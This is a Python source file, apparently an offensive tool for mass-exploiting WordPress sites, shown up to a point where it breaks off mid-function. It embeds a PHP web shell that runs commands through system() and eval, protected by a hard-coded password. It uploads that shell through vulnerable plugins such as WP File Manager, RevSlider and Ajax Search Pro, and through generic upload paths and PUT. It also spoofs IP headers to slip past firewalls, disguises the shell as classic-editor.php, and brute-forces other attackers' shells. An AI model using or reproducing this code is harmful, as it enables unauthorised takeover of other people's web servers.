import requests
import re
import time
import os
import sys
import json
import random
import string
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import threading

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JUDOL_KEYWORDS = [
    'slot', 'gacor', 'deposit', 'bonus', 'jackpot', 'rtp', 'pragmatic', 
    'pg soft', 'togel', 'casino', 'zeus', 'olympus', 'maxwin', 'scatter',
    'mahjong', 'ways', 'wild', 'bet', 'judi', 'bola', 'poker', 'situs'
]

SHELL_REGEX_PATTERNS = [
    r'uid=\d+\(.*\)',
    r'gid=\d+\(.*\)',
    r'Current Dir:',
    r'File Manager',
    r'Upload File',
    r'Execute Command',
    r'wso_ver',
    r'b374k',
    r'IndoXploit',
    r'WSO\s*[\d\.]+',
    r'Shell\s*v\d+',
    r'C99Shell',
    r'R57Shell',
    r'ALFA\s*TEaM',
    r'Leaf\s*Mailer',
    r'Mau\s*Upload\s*Apa',
    r'Uname:',
    r'multipart/form-data',
    r'type="file"',
    r'name="cmd"',
    r'eval\(base64_decode',
    r'FilesMan',
    r'WebShell',
    r'Mini\s*Shell',
    r'Priv8',
    r'Angel\s*Shell',
    r'g6\s*shell',
    r'h4x0r',
    r'input\s*name\s*=\s*["\']?cmd["\']?',
    r'input\s*name\s*=\s*["\']?pass["\']?',
    r'type\s*=\s*["\']?submit["\']?',
    r'value\s*=\s*["\']?execute["\']?',
    r'Symlink',
    r'Zone-H',
    r'linux',
    r'windows',
    r'drwxr',
    r'Safe_mode',
    r'Disable_functions',
    r'Open_basedir',
    r'php_uname',
    r'posix_getpwuid',
    r'disk_total_space'
]

SHELL_TITLE_REGEX = [
    r'WSO', r'Shell', r'b374k', r'IndoXploit', r'File Manager', r'Priv8', 
    r'Mini Shell', r'MadSpot', r'C99', r'R57', r'Remot', r'Hacked', 
    r'Defaced', r'Upload', r'Bypass', r'Root', r'Command', r'Backdoor',
    r'Mailer', r'0x', r'pwn', r'Admin', r'Dashboard'
]

WP_VULN_PLUGINS = [
    {'name': 'wp-file-manager', 'path': 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 'keywords': ['errUnknownCmd', 'json', 'currentFolder']},
    {'name': 'wp-file-manager-old', 'path': 'wp-content/plugins/wp-file-manager/lib/php/connector.php', 'keywords': ['errUnknownCmd', 'json', 'currentFolder']},
    {'name': 'ajax-search-pro', 'path': 'wp-content/plugins/ajax-search-pro/js/file_upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'revslider', 'path': 'wp-content/plugins/revslider/temp/update_extract/revslider/update.php', 'keywords': ['revslider', 'update', 'failed']},
    {'name': 'mail-masta', 'path': 'wp-content/plugins/mail-masta/inc/campaign/count_of_send.php', 'keywords': ['error', 'warning', 'mysql']},
    {'name': 'formidable', 'path': 'wp-content/plugins/formidable/php/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'gravityforms', 'path': 'wp-content/plugins/gravityforms/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'superstorefinder', 'path': 'wp-content/plugins/superstorefinder/wpsf-uploadify.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'showbiz', 'path': 'wp-content/plugins/showbiz/temp/update_extract/showbiz/update.php', 'keywords': ['showbiz', 'update']},
    {'name': 'synoptic', 'path': 'wp-content/plugins/synoptic/lib/uploadify/uploadify.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'tdo-mini-forms', 'path': 'wp-content/plugins/tdo-mini-forms/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'upload', 'path': 'wp-content/themes/uploadify/uploadify.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-google-map', 'path': 'wp-content/plugins/wp-google-map/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'zs-tools', 'path': 'wp-content/plugins/zs-tools/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'cp-multi-view-calendar', 'path': 'wp-content/plugins/cp-multi-view-calendar/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'cp-contact-form-with-paypal', 'path': 'wp-content/plugins/cp-contact-form-with-paypal/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'simple-download-monitor', 'path': 'wp-content/plugins/simple-download-monitor/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-easycart', 'path': 'wp-content/plugins/wp-easycart/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'easy-media-gallery', 'path': 'wp-content/plugins/easy-media-gallery/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'yop-poll', 'path': 'wp-content/plugins/yop-poll/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'formcraft', 'path': 'wp-content/plugins/formcraft/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'inboundiomarketing', 'path': 'wp-content/plugins/inboundiomarketing/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wpdatatables', 'path': 'wp-content/plugins/wpdatatables/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wplms', 'path': 'wp-content/plugins/wplms/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-symposium', 'path': 'wp-content/plugins/wp-symposium/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'monarch', 'path': 'wp-content/plugins/monarch/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'blaze', 'path': 'wp-content/plugins/blaze/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'visual-form-builder', 'path': 'wp-content/plugins/visual-form-builder/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'adning', 'path': 'wp-content/plugins/adning/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'ultimate-member', 'path': 'wp-content/plugins/ultimate-member/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'powerzoomer', 'path': 'wp-content/plugins/powerzoomer/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wptf', 'path': 'wp-content/plugins/wptf/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-responsive-menu', 'path': 'wp-content/plugins/wp-responsive-menu/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'duplicator', 'path': 'wp-content/plugins/duplicator/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-advanced-search', 'path': 'wp-content/plugins/wp-advanced-search/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'mp3-jplayer', 'path': 'wp-content/plugins/mp3-jplayer/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'crayon-syntax-highlighter', 'path': 'wp-content/plugins/crayon-syntax-highlighter/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-dbmanager', 'path': 'wp-content/plugins/wp-dbmanager/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'google-maps-ready', 'path': 'wp-content/plugins/google-maps-ready/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-survey-and-poll', 'path': 'wp-content/plugins/wp-survey-and-poll/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-ecommerce', 'path': 'wp-content/plugins/wp-ecommerce/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-mobile-detector', 'path': 'wp-content/plugins/wp-mobile-detector/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-slimstat', 'path': 'wp-content/plugins/wp-slimstat/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-phpmyadmin', 'path': 'wp-content/plugins/wp-phpmyadmin/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-all-import', 'path': 'wp-content/plugins/wp-all-import/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-all-export', 'path': 'wp-content/plugins/wp-all-export/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-clone-by-wp-academy', 'path': 'wp-content/plugins/wp-clone-by-wp-academy/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'backwpup', 'path': 'wp-content/plugins/backwpup/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'updraftplus', 'path': 'wp-content/plugins/updraftplus/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wordfence', 'path': 'wp-content/plugins/wordfence/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'all-in-one-wp-security', 'path': 'wp-content/plugins/all-in-one-wp-security-and-firewall/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'bulletproof-security', 'path': 'wp-content/plugins/bulletproof-security/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-simple-firewall', 'path': 'wp-content/plugins/wp-simple-firewall/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'sucuri-scanner', 'path': 'wp-content/plugins/sucuri-scanner/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-cerber', 'path': 'wp-content/plugins/wp-cerber/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-security-audit-log', 'path': 'wp-content/plugins/wp-security-audit-log/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-optimize', 'path': 'wp-content/plugins/wp-optimize/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-rocket', 'path': 'wp-content/plugins/wp-rocket/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'w3-total-cache', 'path': 'wp-content/plugins/w3-total-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'autoptimize', 'path': 'wp-content/plugins/autoptimize/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-super-cache', 'path': 'wp-content/plugins/wp-super-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'litespeed-cache', 'path': 'wp-content/plugins/litespeed-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'redis-cache', 'path': 'wp-content/plugins/redis-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-fastest-cache', 'path': 'wp-content/plugins/wp-fastest-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'hummingbird-performance', 'path': 'wp-content/plugins/hummingbird-performance/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'perfmatters', 'path': 'wp-content/plugins/perfmatters/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'asset-cleanup', 'path': 'wp-content/plugins/wp-asset-clean-up/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'flying-press', 'path': 'wp-content/plugins/flying-press/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'swift-performance', 'path': 'wp-content/plugins/swift-performance/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'nitropack', 'path': 'wp-content/plugins/nitropack/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'cache-enabler', 'path': 'wp-content/plugins/cache-enabler/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'comet-cache', 'path': 'wp-content/plugins/comet-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'hyper-cache', 'path': 'wp-content/plugins/hyper-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-fast-cache', 'path': 'wp-content/plugins/wp-fast-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'simple-cache', 'path': 'wp-content/plugins/simple-cache/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'breeze', 'path': 'wp-content/plugins/breeze/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'speed-booster-pack', 'path': 'wp-content/plugins/speed-booster-pack/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-performance-score-booster', 'path': 'wp-content/plugins/wp-performance-score-booster/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'remove-query-strings', 'path': 'wp-content/plugins/remove-query-strings-from-static-resources/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'query-monitor', 'path': 'wp-content/plugins/query-monitor/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'p3-profiler', 'path': 'wp-content/plugins/p3-profiler/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'debug-bar', 'path': 'wp-content/plugins/debug-bar/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-debugging', 'path': 'wp-content/plugins/wp-debugging/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'log-deprecated-notices', 'path': 'wp-content/plugins/log-deprecated-notices/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-crontrol', 'path': 'wp-content/plugins/wp-crontrol/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'advanced-cron-manager', 'path': 'wp-content/plugins/advanced-cron-manager/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-cron-status', 'path': 'wp-content/plugins/wp-cron-status/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-cron-cleaner', 'path': 'wp-content/plugins/wp-cron-cleaner/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-cron-manager', 'path': 'wp-content/plugins/wp-cron-manager/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-cron-optimizer', 'path': 'wp-content/plugins/wp-cron-optimizer/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-cron-scheduler', 'path': 'wp-content/plugins/wp-cron-scheduler/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-cron-setup', 'path': 'wp-content/plugins/wp-cron-setup/upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'wp-cron-viewer', 'path': 'wp-content/plugins/wp-cron-viewer/upload.php', 'keywords': ['0', 'error', 'upload']}
]

WP_FILEMANAGER_EXPLOIT_PATHS = [
    'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
    'wp-content/plugins/wp-file-manager/lib/php/connector.php',
    'wp-content/plugins/file-manager/connector.php',
    'wp-content/plugins/file-manager-advanced/connector.php',
    'wp-content/plugins/responsive-filemanager/connector.php',
    'wp-admin/css/color-picker-rtl.css',
    'wp-admin/css/color-picker.css',
    'wp-admin/js/color-picker.js',
    'wp-includes/js/plupload/plupload.html4.js',
    'wp-includes/js/plupload/plupload.js',
    'wp-includes/js/swfupload/plugins/swfupload.speed.js',
    'wp-includes/js/swfupload/swfupload.js',
    'wp-content/uploads/',
    'wp-content/plugins/',
    'wp-content/themes/',
    'wp-admin/includes/file.php',
    'wp-admin/async-upload.php',
    'wp-admin/media-upload.php'
]

SHELL_PASSWORD = "aezeron"
SHELL_CONTENT = """<?php
// Aezeron Shell Template
$pass = "aezeron";
if(isset($_REQUEST['p']) && $_REQUEST['p']==$pass){
    echo "Aezeron Shell Active";
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        system($_REQUEST['cmd']);
        echo "</pre>";
        die;
    }
    if(isset($_FILES['f'])){
        if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
            echo "Upload Success";
        }
    }
    die;
}
if(isset($_POST['code'])){
    eval($_POST['code']);
    die;
}
echo "WordPress Shell by Exploiter";
?>"""

class WPFileManagerExploit:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            # WAF Bypass Headers
            'X-Forwarded-For': self._random_ip(),
            'X-Originating-IP': self._random_ip(),
            'X-Remote-IP': self._random_ip(),
            'X-Remote-Addr': self._random_ip(),
            'Client-IP': self._random_ip()
        })

    def _random_ip(self):
        return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

    def is_shell(self, content):
        for pattern in SHELL_REGEX_PATTERNS:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def verify_shell(self, url):
        try:
            # 1. Initial request, check for hard errors and redirects
            resp = self.session.get(url, timeout=10, allow_redirects=True)
            if resp.status_code != 200 or 'wp-login.php' in resp.url:
                return False

            content = resp.text
            content_lower = content.lower()

            # 2. Filter out blank pages and negative keywords
            if not content.strip() or len(content) < 50:
                return False
            
            negative_keywords = [
                '404 not found', 'page not found', 'error 404', 'hacked by', 'defaced', 
                'forbidden', 'access denied', 'internal server error',
                'user_login', 'user_pass', 'wp-submit', 'loginform', 'your profile', 
                'lost your password', 'username or email', 'log in'
            ]
            negative_keywords.extend(JUDOL_KEYWORDS)
            if any(x in content_lower for x in negative_keywords):
                return False

            # 3. Primary check: Our own shell with password. Highest confidence.
            check_url = f"{url}?p={SHELL_PASSWORD}"
            resp_pass = self.session.get(check_url, timeout=5)
            if resp_pass.status_code == 200 and "Aezeron Shell Active" in resp_pass.text:
                return True

            # 4. Secondary check: Other shells, using title and content patterns for validation.
            has_shell_title = False
            title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE)
            if title_match:
                title = title_match.group(1).strip()
                for pattern in SHELL_TITLE_REGEX:
                    if re.search(pattern, title, re.IGNORECASE):
                        has_shell_title = True
                        break
            
            content_pattern_score = 0
            for pattern in SHELL_REGEX_PATTERNS:
                if re.search(pattern, content, re.IGNORECASE):
                    content_pattern_score += 1

            # A shell is valid if it has a shell title OR matches multiple content patterns.
            if has_shell_title or content_pattern_score >= 3:
                return True

            # If all checks fail, it's a false positive.
            return False
        except:
            return False
    
    def brute_force_shell(self, url):
        passwords = [
            'admin', 'pass', 'password', '123456', 'root', 'toor', 'qwerty', 
            'indoxploit', 'b374k', 'ganteng', '123', '1', 'a', 'admin123', 
            'aezeron', 'leaf', 'blue', 'hacker', '12345', '12345678', '123456789',
            'user', 'changeme', 'admin@123', 'secret', 'root123'
        ]
        params = ['p', 'pass', 'password', 'pw', 'key', 'code', 'cmd']
        
        # --- NEW: FORM-BASED BRUTEFORCE ---
        try:
            initial_resp = self.session.get(url, timeout=7)
            if initial_resp.status_code == 200:
                content = initial_resp.text
                
                # Robust input field detection (handles attributes in any order)
                inputs = re.findall(r'<input[^>]+>', content, re.IGNORECASE)
                pass_field_name = None
                user_field_name = None
                
                for inp in inputs:
                    if 'type="password"' in inp.lower() or "type='password'" in inp.lower():
                        name_match = re.search(r'name=["\']([^"\']+)["\']', inp, re.IGNORECASE)
                        if name_match:
                            pass_field_name = name_match.group(1)
                    elif 'type="text"' in inp.lower() or "type='text'" in inp.lower():
                        name_match = re.search(r'name=["\']([^"\']+)["\']', inp, re.IGNORECASE)
                        if name_match:
                            name_val = name_match.group(1)
                            if any(x in name_val.lower() for x in ['user', 'login', 'usr', 'name', 'id', 'log']):
                                user_field_name = name_val

                if pass_field_name:
                    print(f"    {CYAN}[INFO]{RESET} Login form detected. Trying to brute force...")
                    
                    # If we have a username field, try user/pass combos
                    if user_field_name:
                        usernames = ['admin', 'root', 'user', 'test', '']
                        for user in usernames:
                            for pwd in passwords:
                                try:
                                    data = {user_field_name: user, pass_field_name: pwd}
                                    resp = self.session.post(url, data=data, timeout=5, allow_redirects=True)
                                    
                                    # Success if login form is gone and shell content is present
                                    if resp.status_code == 200 and 'type="password"' not in resp.text.lower() and self.is_shell(resp.text):
                                        return f"FORM: {user}:{pwd}", f"user={user_field_name}, pass={pass_field_name}"
                                except:
                                    continue
                    # If only a password field is found
                    else:
                        for pwd in passwords:
                            try:
                                data = {pass_field_name: pwd}
                                resp = self.session.post(url, data=data, timeout=5, allow_redirects=True)
                                if resp.status_code == 200 and 'type="password"' not in resp.text.lower() and self.is_shell(resp.text):
                                    return f"FORM: {pwd}", f"pass={pass_field_name}"
                            except:
                                continue
        except Exception:
            pass # Silently fail form bruteforce and proceed to parameter bruteforce

        # --- EXISTING: PARAMETER-BASED BRUTEFORCE ---
        try:
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200 and any(x in resp.text for x in ['Current Dir:', 'File Manager', 'Upload File', 'uid=']) and 'type="password"' not in resp.text:
                return "nopass", ""
        except:
            pass
            
        for pwd in passwords:
            for param in params:
                try:
                    check_url = f"{url}?{param}={pwd}"
                    resp = self.session.get(check_url, timeout=3)
                    if resp.status_code == 200 and any(x in resp.text for x in ['Current Dir:', 'File Manager', 'Upload File', 'uid=']) and 'type="password"' not in resp.text:
                        return pwd, param
                    
                    resp = self.session.post(url, data={param: pwd}, timeout=3)
                    if resp.status_code == 200 and any(x in resp.text for x in ['Current Dir:', 'File Manager', 'Upload File', 'uid=']) and 'type="password"' not in resp.text:
                        return pwd, param
                except:
                    continue
        return None, None

    def exploit_index_of(self, url):
        try:
            shell_name = f"sh_{random.randint(1000,9999)}.php"
            
            # Method 1: PUT
            headers = {'User-Agent': 'Mozilla/5.0'}
            resp = self.session.put(urljoin(url, shell_name), data=SHELL_CONTENT, headers=headers, timeout=10)
            if resp.status_code in [200, 201, 204]:
                if self.verify_shell(urljoin(url, shell_name)):
                    return True, urljoin(url, shell_name)
            
            # Method 2: POST (Generic uploaders often left in dirs)
            files = {'file': (shell_name, SHELL_CONTENT, 'application/x-php')}
            resp = self.session.post(url, files=files, timeout=10)
            if resp.status_code == 200:
                 if self.verify_shell(urljoin(url, shell_name)):
                    return True, urljoin(url, shell_name)
        except:
            pass
        return False, None

    def check_vulnerable_plugin(self, target_url, plugin_path):
        test_url = urljoin(target_url, plugin_path)
        
        try:
            response = self.session.get(test_url, timeout=5)
            
            if response.status_code == 200:
                content = response.text.lower()
                
                if 'error' in content and ('undefined' in content or 'fatal' in content):
                    return False, f"Plugin error but accessible"
                
                if 'wp-content' in content or 'wordpress' in content or 'php' in content:
                    return True, f"Plugin accessible - potential vulnerability"
                
                return True, f"Plugin accessible - status {response.status_code}"
            
            elif response.status_code == 403:
                return False, f"Forbidden - status 403"
            
            elif response.status_code == 404:
                return False, f"Not found - status 404"
            
            else:
                return False, f"Status {response.status_code}"
                
        except requests.exceptions.Timeout:
            return False, "Timeout"
        except requests.exceptions.ConnectionError:
            return False, "Connection error"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def exploit_wp_file_manager(self, target_url):
        exploit_paths = [
            'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
            'wp-content/plugins/wp-file-manager/lib/php/connector.php'
        ]
        
        for path in exploit_paths:
            exploit_url = urljoin(target_url, path)
            
            try:
                check_response = self.session.get(exploit_url, timeout=5)
                
                if check_response.status_code == 200:
                    
                    files = {
                        'upload[]': ('shell.php', SHELL_CONTENT, 'application/x-php')
                    }
                    
                    data = {
                        'cmd': 'upload',
                        'target': 'l1_',
                        'reqid': '174117272919' + str(random.randint(100, 999))
                    }
                    
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Referer': urljoin(target_url, 'wp-admin/admin.php?page=wp_file_manager')
                    }
                    
                    exploit_response = self.session.post(exploit_url, files=files, data=data, headers=headers, timeout=10)
                    
                    if exploit_response.status_code == 200:
                        try:
                            json_response = exploit_response.json()
                            if 'added' in json_response and len(json_response['added']) > 0:
                                shell_path = json_response['added'][0].get('url', json_response['added'][0].get('name'))
                                full_shell_url = urljoin(target_url, shell_path)
                                
                                if self.verify_shell(full_shell_url):
                                    return True, f"Shell uploaded: {full_shell_url}?p={SHELL_PASSWORD}"
                        except:
                            if 'shell.php' in exploit_response.text or 'added' in exploit_response.text:
                                shell_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/../files/shell.php')
                                if self.verify_shell(shell_url):
                                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
                    
                    # Try uploading as classic-editor.php (Stealth/Bypass)
                    files['upload[]'] = ('classic-editor.php', SHELL_CONTENT, 'application/x-php')
                    stealth_response = self.session.post(exploit_url, files=files, data=data, headers=headers, timeout=10)
                    if stealth_response.status_code == 200:
                        if 'added' in stealth_response.text:
                             # Check common paths for classic-editor.php
                             paths = ['wp-content/plugins/wp-file-manager/lib/files/classic-editor.php', 'wp-content/plugins/wp-file-manager/lib/php/../files/classic-editor.php']
                             for p in paths:
                                 s_url = urljoin(target_url, p)
                                 if self.verify_shell(s_url):
                                     return True, f"Stealth Shell uploaded: {s_url}?p={SHELL_PASSWORD}"

                    return False, f"Exploit attempt failed - status {exploit_response.status_code}"
                
            except Exception as e:
                continue
        
        return False, "File Manager not vulnerable"
    
    def exploit_ajax_search_pro(self, target_url):
        exploit_path = 'wp-content/plugins/ajax-search-pro/js/file_upload.php'
        exploit_url = urljoin(target_url, exploit_path)
        
        try:
            check_response = self.session.get(exploit_url, timeout=5)
            
            if check_response.status_code == 200:
                
                files = {
                    'files[]': ('shell.php', SHELL_CONTENT, 'application/x-php')
                }
                
                exploit_response = self.session.post(exploit_url, files=files, timeout=10)
                
                if exploit_response.status_code == 200:
                    try:
                        json_response = exploit_response.json()
                        if 'files' in json_response and len(json_response['files']) > 0:
                            shell_name = json_response['files'][0]['name']
                            shell_url = urljoin(target_url, f'wp-content/plugins/ajax-search-pro/js/{shell_name}')
                            
                            if self.verify_shell(shell_url):
                                return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
                    except:
                        if '.php' in exploit_response.text:
                            shell_url = urljoin(target_url, 'wp-content/plugins/ajax-search-pro/js/shell.php')
                            if self.verify_shell(shell_url):
                                return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
                
                return False, f"Ajax Search Pro exploit failed"
            
            return False, f"Ajax Search Pro not accessible"
            
        except Exception as e:
            return False, f"Ajax Search Pro error: {str(e)}"
    
    def exploit_revslider(self, target_url):
        exploit_path = 'wp-content/plugins/revslider/temp/update_extract/revslider/update.php'
        exploit_url = urljoin(target_url, exploit_path)
        
        try:
            shell_name = f'revshell{random.randint(1000, 9999)}.php'
            shell_content = SHELL_CONTENT
            
            files = {
                'update_file': (shell_name, shell_content, 'application/x-php')
            }
            
            data = {
                'action': 'revslider_ajax_action',
                'client_action': 'update_plugin'
            }
            
            exploit_response = self.session.post(exploit_url, files=files, data=data, timeout=10)
            
            if exploit_response.status_code == 200:
                shell_url = urljoin(target_url, f'wp-content/plugins/revslider/temp/update_extract/revslider/{shell_name}')
                
                if self.verify_shell(shell_url):
                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
            
            return False, f"RevSlider exploit failed"
            
        except Exception as e:
            return False, f"RevSlider error: {str(e)}"
    
    def brute_force_upload(self, target_url):
        upload_paths = [
            'wp-content/plugins/formidable/php/upload.php',
            'wp-admin/async-upload.php',
            'wp-admin/media-upload.php',
            'wp-content/themes/twentytwentyone/inc/upload.php',
            'wp-content/themes/twentytwenty/inc/upload.php',
            'wp-content/themes/twentynineteen/inc/upload.php',
            'wp-content/themes/twentyseventeen/inc/upload.php',
            'wp-content/themes/twentysixteen/inc/upload.php',
            'wp-content/themes/twentyfifteen/inc/upload.php'
        ]
        
        for path in upload_paths:
            upload_url = urljoin(target_url, path)
            
            try:
                test_response = self.session.get(upload_url, timeout=3)
                
                if test_response.status_code in [200, 403]:
                    
                    shell_name = f'upload_{random.randint(1000, 9999)}.php'
                    
                    files = {
                        'file': (shell_name, SHELL_CONTENT, 'application/x-php'),
                        'upload': (None, 'Submit')
                    }
                    
                    headers = {
                        'Content-Type': 'multipart/form-data',
                        'Referer': target_url
                    }
                    
                    upload_response = self.session.post(upload_url, files=files, headers=headers, timeout=10)
                    
                    if upload_response.status_code == 200:
                        possible_paths = [
                            f'wp-content/uploads/{shell_name}',
                            f'wp-content/plugins/formidable/{shell_name}',
                            f'wp-content/themes/{shell_name}',
                            shell_name
                        ]
                        
                        for shell_path in possible_paths:
                            shell_url = urljoin(target_url, shell_path)
                            try:
                                if self.verify_shell(shell_url):
                                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
                            except:
                                continue
                
            except:
                continue
        
        return False, "Brute force upload failed"

    def exploit_classic_editor_bypass(self, target_url):
        # Attempts to upload a shell disguised as classic-editor.php via various endpoints
        # This often bypasses basic extension filters or WAFs looking for "shell.php"
        endpoints = [
            'wp-admin/async-upload.php',
            'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
        ]
        
        for endpoint in endpoints:
            url = urljoin(target_url, endpoint)
            try:
                files = {'file': ('classic-editor.php', SHELL_CONTENT, 'application/x-php')}
                data = {'name': 'classic-editor.php', 'action': 'upload-attachment'}
                
                resp = self.session.post(url, files=files, data=data, timeout=8)
                if resp.status_code == 200:
                    # Check likely locations
                    check_paths = [
                        'wp-content/uploads/classic-editor.php',
                        f'wp-content/uploads/{time.strftime("%Y/%m")}/classic-editor.php',
                        'wp-content/plugins/wp-file-manager/lib/files/classic-editor.php'
                    ]
                    for p in check_paths:
                        full = urljoin(target_url, p)
                        if self.verify_shell(full):
                            return True, f"Classic Editor Bypass Success: {full}?p={SHELL_PASSWORD}"
            except: 
                pass
        return False, "Classic Editor bypass failed"

    def attempt_generic_upload(self, target_url):
        # Try generic upload to a specific vulnerable URL
        try:
            shell_name = f'up_{random.randint(1000, 9999)}.php'
            # Try different parameter names common in uploaders
